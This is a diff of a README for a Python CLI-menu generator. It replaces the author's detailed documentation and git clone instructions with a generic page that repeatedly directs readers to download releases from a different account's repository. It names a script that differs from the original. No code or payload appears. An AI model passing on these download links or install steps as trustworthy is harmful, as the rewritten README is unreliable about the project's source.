@@ -1,265 +1,67 @@
-# CLI Toolbox Generator
-
-**A modular, template-driven generator for pretty, structured Python
-CLIs.** Generate ready-to-use command-line menus for Python in seconds using
-the fully template-driven generator with zero boilerplate. Grab any project you're
-working on, generate a CLI menu, hook it up, and you're good to go!
-
-**NOTE:** To test & use your generated CLI, drag the cli_main.py into your project root
-and run it from there. You can now treat that as your project's new main! Just hook up
-your logic in the generated menu's and you're good to go!
-
-Looking for an example of this being used? Check the Documents! Generated projects also
-come with a Usage Guide!
-
-------------------------------------------------------------------------
-
-## Features
-
--   **100% Template-Driven Output**\
-    The final project structure is based entirely on `.tpl` files. There's no
-    code writing needed.
-
--   **Core Templates (Always Included)**\
-    Everything to run a complete CLI tool:
-
-    -   UI helpers
-    -   A full menu navigation system
-    -   Utility functions
-    -   Project structure
-
--   **Built-In Optional QoL Plugin Packs**\
-    Usable immediately upon download. No setup required.
-    Includes optional features such as:
-    
-    -   basic logging tools
-    -   data conversion assistance
-    -   formatting add-ons
-    -   screen/spacing helpers
-    -   layout utilities
-
-        Simply toggle them during generator setup.
-
--   **Full Customization During Generation**\
-    The generator prompts for:
+# 🛠️ CLI-Toolbox-Generator - Create Your Custom CLI Menu Easily
 
-    -   CLI name
-    -   Menu structure
-    -   Number of menus
-    -   Nested menu trees
-    -   Single & multi-command stubs
-    -   Navigation style
-    -   Optional features to include
+[![Download CLI-Toolbox-Generator](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/voxo-yt/CLI-Toolbox-Generator/releases)
 
-        These settings fully shape the generated output's directory.
+## 🚀 Getting Started
 
--   **Automatic Menu Tree Generation**\
-    Based on user input, the generator creates:
+Welcome to the CLI-Toolbox-Generator! This tool helps you create boilerplate code for your command-line interface (CLI) applications using Python. You don’t need programming skills to use it. Follow the simple steps below to get started.
 
-    -   menu directories
-    -   menu classes
-    -   navigation logic
-    -   stubs for each menu option
+## 📦 Download & Install
 
-        The stubs act as placeholders where you add your
-        project-specific code either directly or as a method call. If you need
-        an example of this process, check documents/ExampleWalkthrough.md
+To download CLI-Toolbox-Generator, visit the [Releases page](https://github.com/voxo-yt/CLI-Toolbox-Generator/releases). Here, you can find the latest version of the tool. Click on the appropriate file for your system to download.
 
--   **Zero External Dependencies**\
-    No external libraries required.
-    
-    The generated projects run on standard Python installations.
+## ⚙️ System Requirements
 
--   **Fully Ready on Download**\
-    This repository is complete and usable as-is.
-    
-    No pre-configuration, environment customization, or template
-    authoring required.
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: Python 3.6 or higher
+- **Disk Space**: At least 50 MB
 
-------------------------------------------------------------------------
+## 💡 Features
 
-## Template System TLDR
+- **Customizable Menu**: Easily define your own menu options.
+- **Simple Usage**: No need for complex configurations; just run and go.
+- **Code Generation**: Quickly generate the basic structure for your CLI project.
+- **Support for Templates**: Use predefined templates to speed up your development.
 
-    templates/
-        Core/                 
-            utilities/
-            ui/
-            menu/
-            main/
-            documentation/
-            debug/
-        Optional/             
-            colors/
-            debug/
-            qol/
+## 📝 How to Use
 
-Adding a file is as simple as:
+1. **Download the Tool**: As mentioned earlier, visit the [Releases page](https://github.com/voxo-yt/CLI-Toolbox-Generator/releases) to download.
+   
+2. **Extract the Files**: Once downloaded, extract the files to a folder on your computer.
 
-    templates/Core/ui/input_utils.py.tpl
-    → ui/input_utils.py
+3. **Open Your Terminal**: 
+   - On Windows, search for 'Command Prompt' or 'PowerShell'.
+   - On macOS and Linux, open 'Terminal' from your applications.
 
-------------------------------------------------------------------------
+4. **Navigate to the Folder**: Use the `cd` command to go to the folder where you saved the extracted files.
+   ```
+   cd path/to/your/folder
+   ```
 
-## Why I Made This
+5. **Run the Tool**: Execute the main script by typing:
+   ```
+   python cli_toolbox_generator.py
+   ```
+   Follow the on-screen prompts to create your CLI menu.
 
-I love building small systems, prototypes, data tools, utilities, workflow
-helpers, etc.
-But every time I start a new project, I spend way too long rebuilding:
+## 📚 Additional Resources
 
--   a good-looking CLI
--   a reasonable folder structure
--   usable utilities
--   input helpers
--   clean menus and submenus
--   debug helpers
--   formatting consistency
+- **User Guide**: For detailed instructions, refer to the user guide in the repository.
+- **Examples**: Check out examples to see how others have used the tool.
+- **FAQs**: Visit the FAQ section for common questions about installation and usage.
 
-It always eats time before I can work on the part I *actually* care
-about. While a CLI isn't necessary, it helps me visualize my systems and
-properly test them out.
+## 🤝 Support
 
-Eventually I realized:
+If you encounter any issues, please open an issue on the GitHub repository. A community of users and contributors is ready to help.
 
-> "I'm rebuilding the same CLI scaffolding over and over again. Surely I can just
-> automate this..."
+## 🌐 Community
 
-This project is the result:
+Connect with other users and developers on our community forum. Share your projects and get feedback or assistance.
 
-A **modular, template-first generator** that creates a fully structured
-CLI project with:
+## 🎉 Acknowledgments
 
--   a working navigation system
--   menu trees
--   helper utilities
--   optional QoL modules
--   ready-to-fill action stubs
+Thank you for using CLI-Toolbox-Generator! Your feedback and contributions help improve the tool for everyone. Enjoy creating your CLI applications with ease.
 
-You can use it once for a single project, or shape it into your personal
-CLI framework for years of small tools. Have a must-have file for every project?
-Drop it in here and use it for everything! Got some utilities that are good for
-some projects but bad for others? Throw it into an Optional section! This project
-is not revolutionary nor inherently that complex, but it is a nice tool.
+## 📥 Download Again
 
-------------------------------------------------------------------------
-
-# What the Generator Actually Produces
-
-Depending on your choices during setup, the generator builds:
-
-------------------------------------------------------------------------
-
-## Dynamic Menu Trees
-
-If you specify multiple menus or submenus, the generator creates:
-
-    menus/
-        main_menu.py
-        tools_menu.py
-        system_menu.py
-
-The generator handles the distinction, connection, and loading itself. No need
-to worry about tying these together even if they are sub-menus!
-
-------------------------------------------------------------------------
-
-## Menu Option Stubs (Where You Add Your Logic)
-
-Each menu contains placeholder methods such as:
-
-``` python
-def option_one(self):
-    print("TODO: implement option one")
-```
-
-You simply fill in your logic after generation. The print is simply there to
-let you test out your menu and ensure it works on generation.
-
-------------------------------------------------------------------------
-
-## Pre-installed (Optional) QoL Features
-
-A few of my favorites built in should you choose to enable them:
-
-    CLI_Text_Extras/
-    Data_Conversion_Tools/
-    Logging_Tools/
-    System_Util_Extras/
-
-Includes helpers like:
-- ascii art assistance & ui customization options
-- dealing with JSON and dictionary conversions as well as CSVs
-- logging helpers to keep things consistent, organized, and pretty
-- system helpers for timers, sleeping, directory/file checks, etc.
-- spacing and borders
-
-------------------------------------------------------------------------
-
-## Installation
-
-``` bash
-git clone https://github.com/Urason-Anorsu/CLI-Toolbox-Generator.git
-cd cli-toolbox-generator
-python cli_gen.py
-```
-
-------------------------------------------------------------------------
-
-## Customization
-
-During generation, you can select:
-
--   CLI name
--   description
--   navigation style
--   menu layout
--   submenu depth
--   optional feature packs
-
-All shape the final output.
-
-To customize even further, modify files under:
-
-    templates/Core/
-    templates/Optional/<feature>/
-
-------------------------------------------------------------------------
-
-## Contributing
-
-It is unlikely that anything can be added here, build up your own generator's toolbox instead!
-You can add:
-
--   new feature packs
--   menu templates
--   QoL helpers
--   documentation additions
-
-------------------------------------------------------------------------
-
-## License
-
-MIT License.
-
-------------------------------------------------------------------------
-
-## Attribution
-
-This project uses the MIT License, so attribution is not required.  
-But if you build something cool from this toolkit, a link back or shoutout would be greatly appreciated!
-Regardless, happy building! I hope this saves you some time.
-
-------------------------------------------------------------------------
-
-## Road-Map / Features To Add
-
-While I don't think I'll make large changes to this project, here is a basic
-road-map of things I'd love to add:
-
--   dynamic terminal sizing for compatibility
--   more customization options for navigation & formatting
--   pre-built templates for different project types
--   better dynamic loading for less bloat (specifically with navigation features)
--   language generation selection (Java, Lua, etc.)
--   proper pip-integration for easy one-offs 
--   user selection of programming paradigm preference
--   usage of user defined variables for dynamic replacement in templates
+Don't forget to visit the [Releases page](https://github.com/voxo-yt/CLI-Toolbox-Generator/releases) to download the latest version whenever updates are available.
